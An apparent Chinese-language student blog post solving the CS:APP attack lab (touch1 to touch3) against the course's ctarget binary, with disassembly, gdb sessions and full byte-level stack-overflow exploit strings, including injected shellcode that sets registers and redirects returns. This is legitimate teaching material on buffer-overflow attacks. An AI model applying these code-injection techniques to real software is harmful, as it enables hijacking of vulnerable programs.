---
layout: post
title:  "csapp lab3:缓冲区攻击"
categories: 系统基础
tags:  csapp gdb attacklab
author: ganpeng
---

* content
{:toc}


对可执行程序实施一系列缓冲区溢出攻击（buffer overflow attacks），也就是设法通过造成缓冲区溢出来改变该可执行程序的运行内存映像，继而执行一些原来程序中没有的行为。



## touch1

反汇编ctarget可执行文件。找到test，getbuf和touch1函数：

```
0000000000401968 <test>:
  401968:	48 83 ec 08          	sub    $0x8,%rsp
  40196c:	b8 00 00 00 00       	mov    $0x0,%eax
  401971:	e8 32 fe ff ff       	callq  4017a8 <getbuf>
  401976:	89 c2                	mov    %eax,%edx
  401978:	be 88 31 40 00       	mov    $0x403188,%esi
  40197d:	bf 01 00 00 00       	mov    $0x1,%edi
  401982:	b8 00 00 00 00       	mov    $0x0,%eax
  401987:	e8 64 f4 ff ff       	callq  400df0 <__printf_chk@plt>
  40198c:	48 83 c4 08          	add    $0x8,%rsp
  401990:	c3                   	retq   

00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop

00000000004017c0 <touch1>:
  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
  4017cb:	00 00 00 
  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi
  4017d3:	e8 e8 f4 ff ff       	callq  400cc0 <puts@plt>
  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
  4017dd:	e8 ab 04 00 00       	callq  401c8d <validate>
  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
  4017e7:	e8 54 f6 ff ff       	callq  400e40 <exit@plt>
```

test函数调用getbuf，然后开辟了0x28（40）大小的栈空间存放字符串，接着调用Gets读取输入。

要想让程序从getbuf返回到touch1函数而不是test函数，需要通过输入特殊的数据使得getbuf读取的数据超过开辟的空间，然后用touchu1函数的地址覆盖掉test函数的返回地址。

使用gdb调试ctarget可执行文件，在test和getbuf函数中设上断点。

![1](/static/csapp_lab3_1.png)

可以看到getbuf函数开辟了0x28大小的空间，执行到getbuf函数后打印esp减去0x28后的值。

![2](/static/csapp_lab3_2.png)

可以知道缓冲区首地址为 **0x5561dc78**，打印这个地址开始的30个字。

![3](/static/csapp_lab3_3.png)

注意 **0x00401976** 这个地址，其实这个地址就是getbuf的返回地址，从test函数的汇编代码也可以看出来。

那么现在只需要将 **0x00401976** 变成 **0x004017c0** 就可以了。

新建一个文件写入下面这些数据：

```
//每行20字节，最后的004017c0是touch1的地址
01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 16 17 18 19 20
01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 16 17 18 19 20
c0 17 40 00
```

![4](/static/csapp_lab3_4.png)

## touch2

touch2在touch1的基础上加上了一个参数验证的步骤，因此不仅仅要返回到touch2函数，还要让touch2的参数设置成一个特定的cookie，cookie值已经有了，要考虑的是如何将touch2的形参设成cookie。

下面的是touch2的汇编代码：

```
00000000004017ec <touch2>:
  4017ec:	48 83 ec 08          	sub    $0x8,%rsp
  4017f0:	89 fa                	mov    %edi,%edx
  4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc <vlevel>
  4017f9:	00 00 00 
  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 <cookie>
  401802:	75 20                	jne    401824 <touch2+0x38>
  401804:	be e8 30 40 00       	mov    $0x4030e8,%esi
  401809:	bf 01 00 00 00       	mov    $0x1,%edi
  40180e:	b8 00 00 00 00       	mov    $0x0,%eax
  401813:	e8 d8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
  401818:	bf 02 00 00 00       	mov    $0x2,%edi
  40181d:	e8 6b 04 00 00       	callq  401c8d <validate>
  401822:	eb 1e                	jmp    401842 <touch2+0x56>
  401824:	be 10 31 40 00       	mov    $0x403110,%esi
  401829:	bf 01 00 00 00       	mov    $0x1,%edi
  40182e:	b8 00 00 00 00       	mov    $0x0,%eax
  401833:	e8 b8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
  401838:	bf 02 00 00 00       	mov    $0x2,%edi
  40183d:	e8 0d 05 00 00       	callq  401d4f <fail>
  401842:	bf 00 00 00 00       	mov    $0x0,%edi
  401847:	e8 f4 f5 ff ff       	callq  400e40 <exit@plt>
```

现在看一下pdf中的some advice： 

Some Advice:  
- You will want to position a byte representation of the address of your injected code in such a way that
`ret` instruction at the end of the code for `getbuf` will transfer control to it.
- Recall that the first argument to a function is passed in register `%rdi`.
- Your injected code should set the register to your cookie, and then use a `ret` instruction to transfer
control to the first instruction in `touch2`.
- Do not attempt to use `jmp` or `call` instructions in your exploit code. The encodings of destination
addresses for these instructions are difficult to formulate. Use `ret` instructions for all transfers of
control, even when you are not returning from a call.
- See the discussion in Appendix B on how to use tools to generate the byte-level representations of
instruction sequences.

第三点提到了第一个参数是放在rdi寄存器中的（实际是低32位的edi），然后在 **4017fc** 处的指令`cmp    0x202ce2(%rip),%edi`也可以看出来将`edi`和`0x202ce2(%rip)`处的值进行比较。

因为rip是指令寄存器，当执行到这条cmp指令时，rip的值应该是下条指令的地址，也就是 **0x401802** ，加上 **0x202ce2** 后得到 **0x6044e4** ，和指令右边的地址是一样的。使用gdb打印这个地址的内容：

![5](/static/csapp_lab3_5.png)

这个值就是实验事先给的cookie值。

现在的问题是如何将edi设成cookie？  
advice中已经说明了不能使用`jump`和`call`之类的指令来改变程序执行的流程，只能使用`ret`。

那么，可以自己编写代码来将cookie赋给edi，然后再返回到touch2中。

新建文件 **solution2.s** 写入下面的代码（请去掉注释）：

```
mov 0x59b997fa, %edi //将cookie赋给edi
mov 0x004017ec, %esp //使返回地址变为touch2的地址
ret //返回
```

使用`gcc -c solution2.s` 将指令编译成 **solution2.o** 文件，然后使用 `objdum -d solution2.o > solution2_code` 将反汇编得到的指令代码重定向到 **solution2_code** 中，打开 **solution2_code** ，内容如下：

```

solution2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	8b 3c 25 fa 97 b9 59 	mov    0x59b997fa,%edi
   7:	8b 24 25 ec 17 40 00 	mov    0x4017ec,%esp
   e:	c3                   	retq   

```

把字节码填到solution2的开头，并将getbuf返回地址改成 **0x5561dc78**，也就是缓冲区首地址。最后的solution2如下：

```
8b 3c 25 fa 97 b9 59 8b 24 25 ec 17 40 00 c3 16 17 18 19 20
01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 16 17 18 19 20
78 dc 61 55
```

然后gdb调试到getbuf返回前：

![6](/static/csapp_lab3_6.png)

可以看到相应代码的字节码已经放在栈上了，白底为返回地址。使用n执行下一条汇编代码。

![7](/static/csapp_lab3_7.png)

rip已经指向了栈上的代码，接着使用n执行栈上的代码。

![8](/static/csapp_lab3_8.png)

下面这个动态表情恰当地表达出了此时此刻的心情。

![9](/static/csapp_lab3_9.jpg)

当使用n命令时（即next命令），出现了`Cannot find bounds of current function`的提示，根据
[stackoverflow](https://stackoverflow.com/questions/8741493/why-i-do-get-cannot-find-bound-of-current-function-when-i-overwrite-the-ret-ad) 上这个问题的解答，这是因为gdb知道程序的代码段开始和结束地址，当gdb发现rip寄存器指向的指令不在代码段时，就会打印这条信息，但按理说这并不会影响汇编级的指令执行。

而另一个错误信息`Program received signal SIGSEGV, Segmentation fault.`表明程序发生了段错误，并且内核向程序发送了 **SIGSEGV** 信号。

使用 **backtrace** 打印当前的栈信息，结果如下：

![csapp_lab3_10](/static/csapp_lab3_10.png)

说实话，我并不知道发生段错误的真正原因，不过留意到这几个函数的栈帧结果和普通的函数不太一样。一般c语言函数栈帧有两个指针，分别是ebp（或rbp）和esp（或rsp），前者指向栈底（高地址），后者指向栈顶（低地址），两者标示了一个函数栈帧的范围。一般在调用函数后会在被掉函数内部将ebp压栈，然后把esp送到ebp中，最后通过将esp减去一个数值来为被调用函数开辟空间。

而实验中的test、getbuf函数并没有类似这样的操作，所以ebp一直指向的是test栈帧的栈底，即使在调用了getbuf函数之后也没变。这应该是程序有意为之。

(几天之后。。。)

几天后还是想不通，接着我搜索了别人的方法。一开始发现方法差不多啊，为什么别人的能过？找了几遍才发现我的方法出错所在。

其实思路是正确的，错就错在代码写错了，来看一下`solution2.s`:

```
mov 0x59b997fa, %edi //将cookie赋给edi
mov 0x004017ec, %esp //使返回地址变为touch2的地址
ret //返回
```

这里面主要有两个错。
- 一个是常量的引用需要使用`$`符号，否则编译器会认为这是一个地址，段错误就是因为这个地址不能访问。（这个错误找了好久，一开始没有注意到指令的机器码和别人不一样）
- 另一个是`%edi`，程序是64位的，所以这里应该是`%rdi`。这个错误可能不会影响结果的正确性，具体取决于`rdi`的高32位是否为零。
- 另一个是`mov 0x004017ec, %esp`这条指令不能达到返回时转到touch2函数的目的。这是因为ret指令会以esp为指针，将指向的64位数据pop到rip寄存器中。而 **0x004017ec** 指向的地址无法访问，即使能够访问，这个地址的值也不是touch2函数的地址。我们的目的应该是使rsp寄存器指向 **0x004017ec** 这个值。

将`solution2.s`改成下面这样:

```
mov $0x59b997fa,%rdi //将cookie赋给edi
ret
```

按照之前的流程得到机器码为：

```
solution2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	c3                   	retq   
```

把 **solution2** 改成下面这样：
```
48 c7 c7 fa 97 b9 59 c3 09 10 11 12 13 14 15 16 17 18 19 20
01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 16 17 18 19 20
78 dc 61 55 00 00 00 00 ec 17 40 00 00 00 00 00
```

上面的solution2方法通过在最后面加上touch2函数的地址来将控制权转到touch2函数。原因是在getbuf函数ret时rsp指向的是第三行行首的缓冲区首地址，ret之后（ret指令会进行pop）rsp刚好指向后方的touch2函数地址，在将cookie送到rdi寄存器后再次ret就能转到touch2函数了。

![csapp_lab3_11](/static/csapp_lab3_11.png)

## touch3

先看一下advice：

Phase 3 also involves a code injection attack, but passing a string as argument.  
Within the file ctarget there is code for functions hexmatch and touch3 having the following C representations:  

```
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval) {
    char cbuf[110];
    /* Make position of check string unpredictable */
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
}

void touch3(char *sval) {
    vlevel = 3; /*Part of validation protocol */
    if (hexmatch(cookie, sval)) {
        printf("Touch3!:You called touch3(\"%s\")\n", sval);
        validate(3);
    } else {
        printf("Misfire:You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}
```

Your task is to get CTARGET to execute the code for touch3 rather than returning to test. You must make it appear to touch3 as if you have passed a string representation of your cookie as its argument.

**Some Advice:**  
- You will need to include a string representation of your cookie in your exploit string. The string should
consist of the eight hexadecimal digits (ordered from most to least significant) without a leading “0x.”
- Recall that a string is represented in C as a sequence of bytes followed by a byte with value 0. Type
“man ascii” on any Linux machine to see the byte representations of the characters you need.
- Your injected code should set register %rdi to the address of this string.
- When functions hexmatch and strncmp are called, they push data onto the stack, overwriting
portions of memory that held the buffer used by getbuf. As a result, you will need to be careful
where you place the string representation of your cookie.

这次返回touch3也要带一个参数，不过这次参数变成了指向cookie字符串表示形式的指针。最后一点提示说到了 **hexmatch** 和 **strncmp** 这两个函数会改变栈的内容，所以要小心选择放置cookie字符串的位置。

现在问题就是填入cookie字符串和不让字符串被破坏。

用ascii表将cookie转为字符串形式：`0x59b997fa -> 35 39 62 39 39 37 66 61`。

还是利用将代码写到栈上的方法来达到目的。这几个函数非常繁琐，就这个touch3我完全解决花了半个中午加整个晚上，gdb调试调得头晕。。。

代码太长，截取重要部分分析吧。

```
401850:	48 83 c4 80          	add    $0xffffffffffffff80,%rsp //rsp - 128 = 0x5561db88
  401854:	41 89 fc             	mov    %edi,%r12d
  401857:	48 89 f5             	mov    %rsi,%rbp
  40185a:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
  401861:	00 00 
  401863:	48 89 44 24 78       	mov    %rax,0x78(%rsp) //0x78
  401868:	31 c0                	xor    %eax,%eax
  40186a:	e8 41 f5 ff ff       	callq  400db0 <random@plt>
```

首先经过调试发现 **hexmatch** 函数开头直接上了3个 **push** 64位寄存器的指令，这三个指令push的内容会把getbuf开的缓冲区大部分占用掉，这也造成了不能把cookie直接编码到缓冲区上，因此需要使用指令来操作。

根据 **401850** 处汇编代码知道 **hexmatch** 开辟了128字节空间，可以将cookie用指令送到这128字节的低地址处，这样就能避免缓冲区被覆盖导致cookie失效。

**hexmatch** 开辟的空间最低地址为 **0x5561db88**，而缓冲区首址为 **0x5561dc78**，因此可以将cookie放在这两个地址之间，我直接放在了 **0x5561db88**处。

新建`solution3.s`如下：

```
mov $0x5561db88,%rdi //cookie字符串指针送到rdi
push %rax//后面指令用到rax，压栈保存原值
mov $0x6166373939623935,%rax//cookie送到rax
mov %rax,0x5561db88//rax送到 **0x5561db88**
xor %rax,%rax
mov %rax,0x5561db90//后面补零
pop %rax //恢复原值
ret
```

编译反汇编得到机器码：

```
solution3.o:     file format elf64-x86-64

Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 88 db 61 55 	mov    $0x5561db88,%rdi
   7:	50                   	push   %rax
   8:	48 b8 35 39 62 39 39 	movabs $0x6166373939623935,%rax
   f:	37 66 61 
  12:	48 89 04 25 88 db 61 	mov    %rax,0x5561db88
  19:	55 
  1a:	48 31 c0             	xor    %rax,%rax
  1d:	48 89 04 25 90 db 61 	mov    %rax,0x5561db90
  24:	55 
  25:	58                   	pop    %rax
  26:	c3                   	retq   
```

solution3如下：
```
48 c7 c7 88 db 61 55 50 48 b8 35 39 62 39 39 37 66 61 48 89 
04 25 88 db 61 55 48 31 c0 48 89 04 25 90 db 61 55 58 c3 20
78 dc 61 55 00 00 00 00 fa 18 40 00 00 00 00 00
```

![csapp_lab3_12](/static/csapp_lab3_12.png)

一开始测试solution3的时候一直使用rtarget，然后没注意到，结果多调试了好多遍，最后发现调试时候用的是ctarget，直接测试时候用的却是rtarget，还在那想为什么gdb调试结果和直接测试结果不一样。。。真是头痛。

![csapp_lab3_13](/static/csapp_lab3_13.png)